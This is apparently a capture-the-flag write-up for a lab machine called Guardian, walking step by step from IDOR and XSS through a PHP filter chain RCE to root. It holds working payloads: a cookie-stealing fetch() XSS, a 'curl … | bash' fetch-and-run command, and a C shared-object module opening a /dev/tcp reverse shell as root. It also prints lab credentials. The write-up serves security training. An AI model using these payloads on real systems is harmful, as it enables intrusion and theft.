---
tags:
  - Linux
  - Hard
  - IDOR
  - Gitea
  - XSS
  - CSRF
  - PHP
  - PHP_Filter_Chains
  - Malicious_Modules
  - WebApp
---
![banner.png](Images/banner.png)

## User

### Port Scan

As always, we first start off with an nmap scan. This machine only has two ports open: SSH and HTTP.

```
# Nmap 7.95 scan initiated Mon Sep 22 02:34:48 2025 as: /usr/lib/nmap/nmap --privileged -sC -sV -vv -oA nmap/guardian 10.129.16.133
Nmap scan report for 10.129.16.133
Host is up, received echo-reply ttl 63 (0.055s latency).
Scanned at 2025-09-22 02:34:49 GMT for 9s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 9c:69:53:e1:38:3b:de:cd:42:0a:c8:6b:f8:95:b3:62 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEtPLvoTptmr4MsrtI0K/4A73jlDROsZk5pUpkv1rb2VUfEDKmiArBppPYZhUo+Fopcqr4j90edXV+4Usda76kI=
|   256 3c:aa:b9:be:17:2d:5e:99:cc:ff:e1:91:90:38:b7:39 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHTkehIuVT04tJc00jcFVYdmQYDY3RuiImpFenWc9Yi6
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://guardian.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: _default_; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Sep 22 02:34:58 2025 -- 1 IP address (1 host up) scanned in 10.44 seconds
```

### Discovery and Getting the First Account

As part of the output, we see the redirect to `http://guardian.htb`, so we put that in our `/etc/hosts` file. After looking at the web page and running a vhost scan, we also see `http://portal.guardian.htb` available. When navigating to that page, we have a login form for a student. There also is a "Help" button that contains the default credential for new student accounts. Combining that password with the `GU0142023@guardian.htb` student account seen on the default page gives access to the site.
![Pasted image 20250926133055.png](Images/Pasted%20image%2020250926133055.png)
![Pasted image 20250926133132.png](Images/Pasted%20image%2020250926133132.png)

### IDOR in Chat Messages

There are quite a few tabs on the left side of the page, but one of them is "Chats" which show various chat threads of the student. The first chat thread goes to the URL `http://portal.guardian.htb/student/chat.php?chat_users[0]=13&chat_users[1]=14`. Notably, the user ID is present as a parameter for each user in the chat interaction. We can confirm that IDOR is present by changing the 13 -> 12, which reveals another pair's chat thread. We can use `ffuf` to enumerate valid combinations of values to see all other people's chat messages:

`ffuf -w vals:USER1 -w vals:USER2 -request chat_threads.req -request-proto http -fs 5761 > valid_chats`

**chat_threads.req**

```
GET /student/chat.php?chat_users[0]=USER1&chat_users[1]=USER2 HTTP/1.1
Host: portal.guardian.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://portal.guardian.htb/student/chats.php
Cookie: PHPSESSID=49cg8e00ac5hneenkdb4olvbpi
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

Note here that "vals" is a wordlist I created that contains values 0 - 50. `fuff` will try each combination of values for each user and will spit out valid results in `valid_chats`. In trying each of the combinations, we find one combination of 1 and 2 that reveals this message:
![Pasted image 20250926133907.png](Images/Pasted%20image%2020250926133907.png)
This reveals that `jamil.enockson` has a password of `DHsNnk3V503`. We add `gitea.guardian.htb` to our `/etc/hosts` file and see if anything is interesting there.

### Gitea and Cross Site Scripting for Lecturer Pivot

Logging in (note that the username is <jamil.enockson@guardian.htb>), we can see the source code for both the regular `guardian.htb` site along with the `portal.guardian.htb` site. In parsing the code, it makes sense to look for places where the student can interact with a higher privileged user, in this case a "lecturer". One of these interactions is in uploading assignments. In the `view-submissions.php` code, we see the following snippet:

```
<?php
require '../includes/auth.php';
require '../config/db.php';
require '../models/Submission.php';
require '../vendor/autoload.php'; // Include PHPOffice PHP Spreadsheet

use PhpOffice\PhpSpreadsheet\IOFactory;
use PhpOffice\PhpSpreadsheet\Writer\Html;

...

<?php if (pathinfo('../attachment_uploads/' . $submission['attachment_name'], PATHINFO_EXTENSION) === 'xlsx'): ?>
    <div class="mt-8">
        <h3 class="font-semibold text-gray-800 mb-3">Document Preview</h3>
        <div class="overflow-x-auto bg-white p-4 border border-gray-200 rounded-lg">
            <?php
            $spreadsheet = IOFactory::load('../attachment_uploads/' . $submission['attachment_name']);
            $writer = new Html($spreadsheet);
            $writer->writeAllSheets();
            echo $writer->generateHTMLAll();
            ?>
        </div>
    </div>
...
```

Here we can see that when a lecturer navigates to view the submission, it renders the submitted .xlsx spreadsheet into HTML directly. This means that if we can inject an XSS payload into the spreadsheet, we may be able to steal a cookie.

To create the malicious .xlsx file, we can use a site like <https://www.treegrid.com/FSheet> which can create and export Excel sheets from the browser. In this sheet, we can drop the XSS payload of `"><img src=x onerror=fetch('http://<ip>/xss?c='+btoa(document.cookie))>` into one of the Sheet names and export it. Standing up an HTTP web server on port 80 and submitting the spreadsheet to the only open assignment, we get a hit back of the base64 encoded cookie.

![xss submission.png](Images/xss%20submission.png)

![Pasted image 20250926135222.png](Images/Pasted%20image%2020250926135222.png)

We can then replace the current session cookie in the browser with this cookie and become a lecturer, `sammy.treat`.

### RCE through the Admin's Reports Page

Now that we've obtained the lecturer role, we have some more capabilities. One such capability is creating notices which the admin will review. Part of each notice is a "Reference Link" that the admin will click on.

![notice form.png](Images/notice%20form.png)
![admin click.png](Images/admin%20click.png)

With this, we can perform CSRF on the admin's `reports.php` page with an RCE bug. Looking at the code below, a user supplied parameter makes its way into a `<? php include ... ?>` tag which is vulnerable to a php filter chain attack.

```
<?php
require '../includes/auth.php';
require '../config/db.php';

if (!isAuthenticated() || $_SESSION['user_role'] !== 'admin') {
    header('Location: /login.php');
    exit();
}

$report = $_GET['report'] ?? 'reports/academic.php';

if (strpos($report, '..') !== false) {
    die("<h2>Malicious request blocked 🚫 </h2>");
}   

if (!preg_match('/^(.*(enrollment|academic|financial|system)\.php)$/', $report)) {
    die("<h2>Access denied. Invalid file 🚫</h2>");
}

?>
...
            </div>
           
            <?php include($report); ?>
            
        </div>
    </div>
</body>

</html>
```

First, we create a malicious `shell.sh` file that contains a reverse shell and host it with a Python web server. Then, we can use the `php_filter_chain_generator.py` tool to generate our php filter chain attack:

`python3 php_filter_chain_generator.py --chain '<?php system("curl http://10.10.14.106/shell.sh | bash")   ;?> '`

Note that the odd spacing when setting the php chain is to avoid special characters in the base64 preview of the tool. This ends up producing a payload of:

```
http://portal.guardian.htb/admin/reports.php?report=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS| ... convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=reports/system.php
```

Note the resource of `resource=reports/system.php`. Normally this can be a non-existent resource of `php://temp`, however because of the regex rule shown in the code, the report parameter must end in `system.php` (or enrollment/academic/financial). Therefore, we set it to the valid `reports/system.php` resource. We send that payload in the "Reference Link" field of the notice form and pop a reverse shell.

![getting rev shell.png](Images/getting%20rev%20shell.png)

### Getting User Access through Database Hash Cracking

Now that we have a `www-data` shell, we can view the `mysql` database for the `portal.guardian.htb` web app. Continuing to navigate through the source code, the `mysql` credentials are hard coded in `config/config.php`

![db creds.png](Images/db%20creds.png)

Using those credentials, we can view the `mysql` database "guardiandb" and dump the users table containing all user's hashes.

![db dump.png](Images/db%20dump.png)

A clue from `login.php` tells us that the hash type is SHA-256 and that the hash is a combination of a password with a salt.

![hash format.png](Images/hash%20format.png)

A keen eye would've seen the salt of `8Sb)tM1vs1SS` in the `config.php` file. So, for each line in the password hashes file, each line in "guardian.hashes" will have a `<username>:<hash>:<salt>` format for `hashcat`. We can now attempt to crack the hashes with (mode 1410 is SHA-256(password + salt)):

`hashcat -a 0 -m 1410 guardian.hashes ~/Documents/rockyou.txt --username`

With this, two hashes are cracked and give the credentials of:

* admin:fakebake000
* jamil:copperhouse56

The admin password is not useful for us (but can be used to explore the admin pages for any post-pwning exploration). However, we can now `ssh` into the box as `jamil` with that password, giving us the `user.txt` flag.

![becoming jamil.png](Images/becoming%20jamil.png)

## Root

### Pivoting to Mark through a utilities.py script

Now that we are `jamil` on the box, we use `sudo -l` to see that he can run a `utilities.py` script as another user, `mark`.

![sudo -l as jamil.png](Images/sudo%20-l%20as%20jamil.png)

Reading the code, we see that `utilities.py` imports four modules from other Python scripts.

```
#!/usr/bin/env python3                                        
                                                                                                                             
import argparse                                               
import getpass                 
import sys                                                    
                                                              
from utils import db      
from utils import attachments                                 
from utils import logs 
from utils import status
...
```

Looking into the utils folder, we see that our group, `admins`, has write access over the imported module `status.py`.

![utils script perms.png](Images/utils%20script%20perms.png)

Because of this, we can easily modify `status.py` to something like the following:

```
import platform
import psutil
import os

def system_status():
        os.system("/bin/bash")
```

Then, when we execute the `utilities.py` script as `mark`, making sure to use the `system-status` flag, our malicious function will run and give a shell as `mark`.

`sudo -u mark /opt/scripts/utilities/utilities.py system-status`

![mark pviot.png](Images/mark%20pviot.png)

### Obtaining Root through safeapache2ctl

Having become `mark`, running `sudo -l` shows that we can run a binary `safeapache2ctl` as any user. When trying to run it, it shows that we need to pass in a file `/home/mark/confs/file.conf`.
![mark sudo l.png](Images/mark%20sudo%20l.png)

The regular [apache2ctl](https://httpd.apache.org/docs/2.4/programs/apachectl.html) binary has a multitude of privilege escalation vectors (see [GTFObins](https://gtfobins.github.io/gtfobins/apache2ctl/)), however this version of `safeapache2ctl` appears to only allow for the referencing of a `file.conf`. When researching various apache2 configs (like `/etc/apache2/apache2.config`), I saw that there was a way to load a shared object file as a module.

`LoadModule <module name> <shared object file>`

By adding this line to our `file.conf` and referencing a malicious .so module, we can get code execution. I first created the following C code:

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

static void func() __attribute__ ((constructor));

static void func() {
   setuid(0); // 0 uid is for root
   system("bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'");
}
```

I used a reverse shell instead of `/bin/bash` for the payload due to shell stability issues. I then compiled it into the malicious .so file using the following command:

`gcc -shared -fPIC -Wall -o bad.so linux.c`

I then transferred `bad.so`, our compiled malicious C code, to the box and gave it executable rights with `chmod +x bad.so`. I put the binary in `/dev/shm` and added the following line to `file.conf`:

`LoadModule bad_module /dev/shm/bad.so`

Finally, running `sudo /usr/local/bin/safeapache2ctl -f /home/mark/confs/file.conf` pops a root shell on our `nc` listener.

![obtaining root.png](Images/obtaining%20root.png)

## Credentials List

| Username                    | Password                 | Description                                                                                                        |
| --------------------------- | ------------------------ | ------------------------------------------------------------------------------------------------------------------ |
| GU0142023                   | GU1234                   | student access on the `portal.guardian.htb` site                                                                   |
| <jamil.enockson@guardian.htb> | DHsNnk3V503              | gitea access on `gitea.guardian.htb`                                                                               |
| root                        | Gu4rd14n_un1_1s_th3_b3st | for `mysql` guardiandb database                                                                                    |
| jamil                       | copperhouse56            | SSH, user on box                                                                                                   |
| admin                       | fakebake000              | admin access on the `portal.guardian.htb` site                                                                     |
| sammy.treat                 | sammy.treat@000          | sammy's lecturer access on the `portal.garudian.htb` site. Found during post-root in `/home/sammy/lecturer_bot.py` |
